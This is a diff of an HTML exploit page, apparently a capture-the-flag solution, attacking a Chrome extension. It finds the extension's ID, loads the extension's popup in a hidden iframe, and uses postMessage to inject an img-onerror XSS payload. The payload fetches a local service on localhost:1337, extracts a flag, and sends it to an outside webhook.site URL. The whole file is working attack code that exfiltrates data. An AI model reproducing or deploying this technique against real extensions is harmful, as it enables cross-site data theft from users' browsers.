@@ -1,33 +1,37 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <!-- This triggers the extension to run -->
+    <!-- This marquee tag triggers the extension to run -->
     <marquee>test</marquee>
     
     <script>
-        const WEBHOOK = "https://try-pearl-nine.vercel.app/wow.html";
+        // Your webhook URL from webhook.site
+        const WEBHOOK = "https://webhook.site/05ba16cd-cf50-4eb3-89bd-43dfe2a61d6a";
         
         setTimeout(() => {
-            // Wait for extension to replace the marquee with an image
+            // Wait for the extension to replace the marquee with an image
             const img = document.querySelector('img[alt="STOP"]');
             if (img) {
-                // Extract extension ID from the image src
+                // Extract the extension ID dynamically from the image src
                 const extId = img.src.split('/')[2];
                 console.log('Found extension ID:', extId);
                 
+                // Create an iframe to the extension's popup page
                 const iframe = document.createElement('iframe');
                 iframe.src = `chrome-extension://${extId}/popup.html`;
                 iframe.style.display = 'none';
                 
                 iframe.onload = () => {
-                    // Try a simpler payload first
-                    const payload = `<iframe src="http://localhost:1337"></iframe>`;
+                    // Set the replacement string to a payload that exfiltrates the flag
+                    const payload = `<img src=x onerror="fetch('http://localhost:1337').then(r=>r.text()).then(html=>{const m=html.match(/<marquee>([^<]+)<\\/marquee>/);if(m)fetch('${WEBHOOK}?flag='+encodeURIComponent(m[1]))})">`;
                     
+                    // Send the payload to the extension via postMessage
                     iframe.contentWindow.postMessage({
                         type: "SET",
                         replacementString: payload
                     }, "*");
                     
+                    // Redirect to localhost:1337 after a delay
                     setTimeout(() => {
                         window.location.href = 'http://localhost:1337';
                     }, 1000);
@@ -35,7 +39,7 @@
                 
                 document.body.appendChild(iframe);
             } else {
-                console.log('No extension image found');
+                console.log('No extension image found - extension may not have run.');
             }
         }, 2000);
     </script>
